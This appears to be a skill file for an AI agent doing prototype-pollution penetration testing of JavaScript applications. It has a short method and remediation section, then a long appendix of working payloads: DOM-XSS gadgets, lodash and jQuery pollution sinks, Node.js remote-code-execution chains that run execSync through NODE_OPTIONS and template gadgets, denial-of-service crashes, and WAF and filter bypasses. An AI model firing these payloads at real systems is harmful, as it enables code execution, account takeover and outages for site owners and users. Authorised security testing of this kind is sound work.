---
name: prototype_pollution
description: Prototype pollution testing covering client-side and server-side JavaScript object prototype manipulation
---

# Prototype Pollution

Prototype pollution allows attackers to inject properties into JavaScript's `Object.prototype`, affecting all objects in the application. This can lead to XSS, RCE, authentication bypass, or denial of service.

## Attack Surface

**Client-Side**
- URL query parameters parsed into objects (e.g., `?__proto__[admin]=true`)
- Hash fragment, JSON merge operations
- Vulnerable libraries: lodash, jQuery (old), Hoek, merge/deepmerge, qs

**Server-Side (Node.js)**
- JSON body deserialization
- Deep merge / extend utilities
- Template engines evaluating polluted properties

## Testing Methodology

### Step 1 – Client-Side Detection
In browser console, inject via URL:
```
https://target.com/?__proto__[polluted]=yes
```
Then check: `({}).polluted === "yes"` — if `true`, the app is vulnerable.

### Step 2 – JSON Body Injection
```json
{"__proto__": {"isAdmin": true}}
{"constructor": {"prototype": {"isAdmin": true}}}
```
Send in POST body; check if subsequent requests gain elevated privileges.

### Step 3 – Gadget Hunting (Server-Side RCE)
Common gadgets in Node.js:
- `child_process.spawn` options polluted with `shell: true`
- Template engines: Handlebars, Pug, EJS checking polluted properties
- `JSON.parse` / `Object.assign` sinks

```json
{"__proto__": {"outputFunctionName": "_x; process.mainModule.require('child_process').execSync('id > /tmp/pwned'); //"}}
```
(Pug template RCE gadget)

### Step 4 – Property Names to Try
- `__proto__`
- `constructor.prototype`
- `__proto__.constructor.prototype`

### Step 5 – DoS via Pollution
```json
{"__proto__": {"toString": null}}
```
Overriding built-in methods can crash Node.js processes.

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| Server-side RCE via gadget chain | Critical |
| Authentication/authorization bypass | High |
| Client-side XSS via polluted sink | High |
| Denial of service | Medium |

## Remediation

- Use `Object.create(null)` for dictionaries that hold user-supplied keys
- Validate/sanitize keys: reject `__proto__`, `constructor`, `prototype`
- Use `Map` instead of plain objects for user-controlled key-value pairs
- Upgrade vulnerable libraries (lodash ≥ 4.17.21, qs ≥ 6.10.3)
- Set `--frozen-intrinsics` in Node.js (experimental)


## Additional Techniques — ported from WebSkills (writeup-techniques/prototype-pollution)

### Client-side URL/hash → DOM-XSS gadgets (concrete payloads)
Pollute a property a library later reads as config that flows to a sink (`innerHTML`/`eval`/`src`/`Function`). These globals exist on every page, so execution can fire even if the app never touches the property (PortSwigger 2023 "widespread PP gadgets" — 11 browser-built-in gadgets incl. `Notification`, dedicated `Worker`, DOM open-redirect):
```
?__proto__[hitCallback]=alert(document.domain)     # Google Analytics ga() eval-like sink
?__proto__[sequence][0]=1;alert(1)//
?__proto__[srcdoc]=<script>alert(1)</script>       # iframe srcdoc gadget
?__proto__[innerHTML]=<img src onerror=alert(1)>
?__proto__[src]=data:,alert(1)//
?__proto__[template]=<script>alert(1)</script>     # framework template gadget
?__proto__[transport_url]=data:,alert(1)//
```

### Extra key syntaxes — fragment + nested-bracket + allowDots
Beyond `__proto__`/`constructor.prototype`, memorize delivery-notation variants that hit different parsers:
```
?a[__proto__][b]=c          # nested bracket — parser walks a → __proto__
#__proto__[foo]=bar         # in URL fragment: never reaches server/WAF, still parsed client-side
__proto__.foo=bar           # dotted (allowDots parsers, lodash _.set)
```

### jQuery `$.extend` deep-copy admin bypass (CVE-2019-11358)
`$.extend(true, {}, userObj)` walks `__proto__`:
```js
$.extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'))  // ({}).isAdmin === true
```
Chain with CVE-2020-7656 (jQuery <3.4 `<script>` handling) for double XSS. jQuery 3.6.0–3.6.3 also vulnerable (CVE-2023-26136/26140).

### lodash merge/set family — concrete sinks (CVE-2018-3721 / CVE-2019-10744, fixed 4.17.11)
```js
_.merge({}, JSON.parse('{"__proto__":{"polluted":"yes"}}'))
_.defaultsDeep({}, JSON.parse('{"constructor":{"prototype":{"polluted":"yes"}}}'))
_.set({}, '__proto__.polluted', 'yes')          // "define property by path" condition
_.setWith({}, 'constructor.prototype.polluted', 'yes')
_.zipObjectDeep(['__proto__.polluted'], ['yes'])
```

### DOM element innerHTML + array-index pollution
```js
Object.prototype.innerHTML = "<img src onerror=alert(1)>"  // JS-built element emits arbitrary HTML
Object.prototype[0] = "attacker"   // array index that is READ but never written can be polluted
```

### HTML sanitizer bypass via PP
Pollute the sanitizer's internal config maps before init so a dangerous tag/attr passes — a client-only sanitizer PP is still remotely exploitable via reflected params / postMessage / later-rendered stored data:
- **DOMPurify ≤3.0.8 (CVE-2024-45801)** — pollute internal config to bypass `SAFE_FOR_TEMPLATES` → stored XSS (fixed with null-proto maps).
- **sanitize-html <2.8.1** — crafted attribute allow-list on the prototype bypasses filtering.
- **Closure sanitizer** — pollute `ALLOWED_ATTR`/`ALLOWED_TAGS`-style config.

### postMessage → PP → XSS
If receiver merges then executes `postMessage` data, iframe it and post the payload:
```js
victim.postMessage(JSON.stringify({"__proto__":{"innerHTML":"<img src onerror=alert(1)>"}}), "*")
```

### Server-side NON-DESTRUCTIVE detection (avoids the DoS of blind pollution)
Pollute an Express response-formatting internal and watch the response change instead of crashing the server:
```json
{"__proto__":{"json spaces":10}}      // JSON responses come back 10-space indented
{"__proto__":{"status":510}}          // status code change
{"__proto__":{"exposedHeaders":["x"]}}
```
Socket.IO variant: send the pollution over the WS channel and watch the echo/greeting change.

### Express content-type pollution → reflected JSON becomes HTML XSS
App reflects user JSON as `application/json`; pollute Express to serve it as `text/html`:
```json
{"__proto__":{"content-type":"text/html; charset=utf-8"}}
```

### PP2RCE via child_process env / NODE_OPTIONS (`normalizeSpawnArguments` env loop)
Any polluted attribute becomes an env var when a process is spawned. Reliable no-file-write gadget:
```js
Object.prototype.shell = "node";
Object.prototype.argv0 = "console.log(require('child_process').execSync('id').toString())//";
Object.prototype.NODE_OPTIONS = "--require /proc/self/cmdline";
```
`execFile`/`execFileSync` only work if what runs IS node; other methods work regardless because PP can change what is executed.

### PP2RCE filesystem-less — NODE_OPTIONS + `data:` URI (Node ≥19, still works 22.x)
No disk write; also bypasses hardening that filters only `--require`:
```js
Object.prototype.argv0 = "node";
Object.prototype.shell = "node";
Object.prototype.NODE_OPTIONS = "--experimental-loader=data:text/javascript,console.log(require('child_process').execSync('id').toString())";
```

### PP2RCE via polluting the require/spawn file path
If the app `require()`s or spawns a path you can pollute, point it at an on-disk file that shells out on import (grep `child_process` with no leading padding), e.g. `node_modules/npm/scripts/changelog.js`, `node_modules/node-pty/scripts/publish.js`, yarn `preinstall.js`.

### Extra template AST gadgets — EJS + Handlebars
EJS `outputFunctionName` gadget (Pug `block` already covered in fork):
```json
{"__proto__":{"outputFunctionName":"x;process.mainModule.require('child_process').execSync('id');s"}}
```
Handlebars: pollute the compiler so a string template is treated as pre-parsed (`compiler == 8` check) and inject into `compilerInfo`/`main`.

### DoS via `__proto__` as an HTTP header NAME
Sending `__proto__` as a header name reaches `req.headersDistinct` → uncaught `TypeError` → Node process crash (unauth DoS, H1).

### Python "class pollution" (adjacent) + Flask secret overwrite
Same idea via `__class__`/`__globals__`/`__kwdefaults__` traversal — pollute default kwargs or reach `app.secret_key` across files to forge Flask session cookies.

### Filter / WAF bypasses
- `__proto__` blocked → `constructor.prototype` (and vice-versa).
- `__proto__[x]` filtered → `__proto__.x` (allowDots) or JSON-body form.
- NODE_OPTIONS allow-lists that only strip `--require` → use `--experimental-loader`/`--import` + `data:` URI.
- WAF wanting a domain in payload → use `/proc/self/cmdline` or `/proc/self/environ` require target, or a `data:` URI (no external domain in payload).
- Put payload in the `#` fragment so it never reaches the WAF but is still parsed client-side.

### Tooling
- Client: **DOM Invader** (Burp, dedicated Prototype-pollution tab — auto-mutates `__proto__`/`constructor`, finds gadget→sink chains, shows the dereference line), **ppfuzz**, **ppmap**, **proto-find**, **PPScan**, **protoStalker** (DevTools), BlackFan client-side-PP payload repo.
- Server: **Server-Side-Prototype-Pollution-Gadgets-Scanner** / **server-side-prototype-pollution** Burp extensions.

### Additional escalation precedents
- **Next.js RSC** — `multipart/form-data` PP in Server Actions → RCE via `NEXT_REDIRECT` (CVE-2025-55182/66478, ≤15.1.3, "React2Shell").
- **Electron** — pollute internal `require` reference → contextIsolation escape → RCE.

### Confirmation caveat
PP only works when the target attribute is `undefined` at read time — if the code explicitly assigns that attribute you can't override it; pick a genuinely-unset property. Confirm server RCE via OAST (`Object.prototype.NODE_OPTIONS="--inspect=<COLLAB>"` DNS hit) before firing a real command.
